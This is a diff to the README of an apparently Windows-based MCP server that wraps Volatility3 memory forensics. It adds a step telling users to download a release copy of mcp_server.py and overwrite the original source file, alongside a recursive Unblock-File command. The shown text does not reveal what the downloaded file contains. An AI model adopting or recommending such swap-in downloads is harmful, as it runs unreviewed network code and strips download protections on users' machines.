@@ -4,7 +4,6 @@ A Model Context Protocol (MCP) server that integrates Volatility3 memory forensi
 
 # Demo:
 https://github.com/user-attachments/assets/60936f5b-9792-45e3-8d74-9379db8b97a9
-
 # Tested On:
 
 - Windows 11 24h2
@@ -52,6 +51,9 @@ Get-ChildItem -Path . -Recurse -File | Unblock-File
 .\setup_all.ps1
 ```
 
+***==Note:== after executing `setup_all.ps1` download `mcp_server.py` from releases and place it in `%USERPROFILE%\volatility-mcp-server\src` folder (replace the original file with this)***
+
+***Link to download***: https://github.com/0xOb5k-J/vol3-mcp-win/releases/download/mcp_server_1.0.py/mcp_server.py
 ## Configuration
 
 ### Windows MCP Configuration
